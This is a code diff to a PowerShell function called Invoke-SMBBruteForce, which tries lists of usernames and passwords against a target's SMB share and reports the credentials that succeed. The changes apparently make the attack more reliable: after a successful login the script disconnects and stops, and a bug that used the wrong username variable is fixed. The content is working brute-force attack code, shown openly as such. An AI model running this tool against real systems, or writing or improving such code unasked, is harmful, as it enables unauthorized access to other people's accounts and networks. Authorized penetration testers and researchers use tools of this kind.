@@ -75,9 +75,9 @@ function Invoke-SMBBruteForce
         $Counter = 0
         Write-Host "[*]Trying to authenticate against \\$target"
 
-        Write-Host "[*]Starting Brute Force Operation"
             if(!$Username)
             {
+                Write-Host "[*]Starting Brute Force Operation"
                 $UserFileLength = (Get-Content $UsernameFile).Length
                 Write-Host "[*]Loaded $UserFileLength from $UsernameFile"
                 foreach($user in get-content $UsernameFile)
@@ -91,6 +91,8 @@ function Invoke-SMBBruteForce
                              if($valid)
                              {
                                 Write-Host "[*]Success! Password for $u is $Password"
+                                Remove-SMBMapping -remotepath \\$target
+                                break
                                 }
                         }
                         catch 
@@ -113,6 +115,8 @@ function Invoke-SMBBruteForce
                                 if($valid)
                                 {
                                 write-host "[*]Success! Password for $u is $pw"
+                                Remove-SMBMapping -remotepath \\$target
+                                break
                                 }
                             }
                             catch
@@ -140,6 +144,8 @@ function Invoke-SMBBruteForce
                          if($valid)
                          {
                             write-host "[*]Success! Password for $u is $Password"
+                            Remove-SMBMapping -remotepath \\$target
+                            break
                             }
                     }
                     catch 
@@ -157,10 +163,12 @@ function Invoke-SMBBruteForce
                     {
                         try
                         {
-                            $valid = new-smbmapping -remotepath \\$target -username $user -password $pw -EA SilentlyContinue
+                            $valid = new-smbmapping -remotepath \\$target -username $u -password $pw -EA SilentlyContinue
                             if($valid)
                             {
                                 Write-Host "[*]Success! Password for $u is $pw"
+                                Remove-SMBMapping -remotepath \\$target
+                                break
                                 }
                         }
                         catch
